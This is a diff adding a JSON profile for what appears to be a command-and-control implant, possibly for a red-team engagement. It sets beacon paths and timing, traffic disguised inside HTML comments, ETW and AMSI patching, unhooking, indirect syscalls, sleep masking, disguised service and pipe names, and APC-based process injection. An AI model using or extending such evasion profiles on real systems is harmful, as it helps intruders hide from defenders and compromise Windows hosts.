@@ -1,0 +1,61 @@
+{
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+  "checkin_path": "/api/v1/checkin/health",
+  "register_path": "/api/v1/register/verify/trace/f6f2fb5c",
+  "result_path": "/api/v1/result/v3/client/b97f676",
+  "stage1_path": "/api/v1/stage/status",
+  "tunnel_path": "/api/v1/tunnel/v2",
+  "profile_name": "default-46d00699fcb08b79",
+  "profile_fingerprint": "46d00699fcb08b79",
+  "engagement_id": "validate-eng",
+  "build_nonce": "deadbeef",
+  "sleep_time": 60,
+  "jitter": 20,
+  "malleable_wire": {
+    "out_base64": true,
+    "in_base64": true,
+    "out_prepend": "<!-- ",
+    "out_append": ");",
+    "in_prepend": "callback(",
+    "in_append": " -->",
+    "mask_key": 194
+  },
+  "http_headers": {
+    "Accept": "*/*",
+    "Accept-Language": "en-US,en;q=0.9"
+  },
+  "evasion": {
+    "patch_etw": true,
+    "patch_amsi": true,
+    "unhook_on_load": true,
+    "heap_encrypt": true,
+    "syscall_method": "indirect",
+    "sleep_technique": "ekko",
+    "anti_analysis": false
+  },
+  "ioc": {
+    "named_pipes": [
+      "\\\\pipe\\svc_ffe2fa8f",
+      "\\\\pipe\\atsvc_5e0f234c",
+      "\\\\pipe\\spoolss_12adb1e3",
+      "\\\\pipe\\srvsvc_c6a4926f"
+    ],
+    "service_names": [
+      "WinUpdate232c87",
+      "SysHelperd56ac0",
+      "NetAgent13dd74"
+    ],
+    "mutex_names": [
+      "Global\\d151fe8c07a383cb"
+    ]
+  },
+  "spawn_to": {
+    "x86": "%windir%\\SysWOW64\\rundll32.exe",
+    "x64": "%windir%\\System32\\rundll32.exe"
+  },
+  "process_inject": {
+    "alloc_type": "NtMapViewOfSection",
+    "execute_type": "NtQueueApcThread",
+    "use_syscalls": true
+  }
+}
